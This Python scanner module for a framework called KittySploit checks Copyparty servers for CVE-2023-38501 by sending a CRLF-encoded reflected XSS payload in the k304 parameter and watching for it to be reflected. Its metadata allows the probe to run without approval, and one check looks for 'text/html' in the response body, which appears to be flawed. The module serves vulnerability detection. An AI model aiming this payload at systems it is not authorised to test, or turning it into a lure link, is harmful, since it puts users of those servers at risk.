#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Copyparty is a portable file server."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CopyParty v1.8.6 - Cross Site Scripting Detection',
        'description': 'Copyparty is a portable file server. Versions prior to 1.8.6 are subject to a reflected cross-site scripting (XSS) Attack.Vulnerability that exists in the web interface of the application could allow an attacker to execute malicious javascript code by tricking users into accessing a malicious link.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'packetstorm', 'copyparty', 'xss', 'oss', 'copyparty_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/51635',
            'https://github.com/9001/copyparty/releases/tag/v1.8.6',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-38501',
            'http://packetstormsecurity.com/files/173821/Copyparty-1.8.6-Cross-Site-Scripting.html',
            'https://github.com/9001/copyparty/commit/007d948cb982daa05bc6619cd20ee55b7e834c38',
        ],
        'cve': 'CVE-2023-38501',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(document.domain)%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('<img src=copyparty onerror=alert(document.domain)>',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="CopyParty v1.8.6 - Cross Site Scripting detected",
                path='/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(document.domain)%3E',
            )
            return True
        return False

